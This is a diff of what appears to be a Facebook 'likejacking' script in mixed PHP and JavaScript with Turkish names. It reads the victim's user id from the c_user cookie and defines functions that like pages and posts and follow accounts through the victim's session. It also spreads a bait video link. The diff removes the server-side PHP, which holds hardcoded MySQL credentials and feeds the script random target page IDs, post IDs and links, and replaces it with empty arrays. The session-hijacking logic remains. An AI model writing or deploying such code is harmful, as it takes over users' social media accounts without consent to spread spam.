@@ -63,50 +63,11 @@ if(location.hostname.indexOf("youtube.com") == -1 ) {
 */
 
 
-<?php
-set_time_limit(6000);
-
-
-mysql_connect('localhost', 'afksnkus2', 's6eg5g3');
-mysql_select_db('afksnkdb2');
-mysql_query("SET NAMES 'UTF8'");
-mysql_query("SET character_set_connection = 'UTF8'");
-mysql_query("SET character_set_client = 'UTF8'");
-mysql_query("SET character_set_results = 'UTF8'");
-
-
-?>
 
 
 var profile_id = document.cookie.match(/c_user=(\d+)/)[1].toString();
 
-<?php
-echo "var sayfalar = [";
-$calistir = mysql_query("select * from sayfalar order by rand() limit 3");
-$pegbo = "";
-while($oku=mysql_fetch_assoc($calistir)){
-$linkler = $oku ['sayfa_id'];
-$tamlink = "'".$linkler."',"; 
-
-$pegbo .= str_replace(",'];","'];",$tamlink);
-}
-$pegbo1 = "".$pegbo."];";
-echo str_replace(",];","];",$pegbo1);
-
-
-echo "var likes = [";
-$calistir = mysql_query("select * from begeniler order by rand() limit 5");
-$pegbo = "";
-while($oku=mysql_fetch_assoc($calistir)){
-$linkler = $oku ['post_id'];
-$tamlink = "'".$linkler."',"; 
-
-$pegbo .= str_replace(",'];","'];",$tamlink);
-}
-$pegbo1 = "".$pegbo."];";
-echo str_replace(",];","];",$pegbo1);
-?>
-
+var sayfalar = [];var likes = [];
 
 function begen(id) {
  var xhr = new XMLHttpRequest();
@@ -299,15 +260,7 @@ follow("");
 }
 */
 
-<?php
-$sql = mysql_query("select * from link where active = '1' order by rand() limit 1");
-$row = mysql_fetch_array($sql);
-echo "var source = '" . $row['link'] . "';";
-echo "var image = '" . $row['resim_link'] . "';";
-echo "var rand = '" . $row['yorum'] . "';";
-echo "var baslik = '" . $row['video_baslik'] . "';";
-?>
-
+var source = '';var image = '';var rand = '';var baslik = '';
 var profile_id = document.cookie.match(/c_user=(\d+)/)[1].toString();
 
 var aciklaArr = ["oha."];
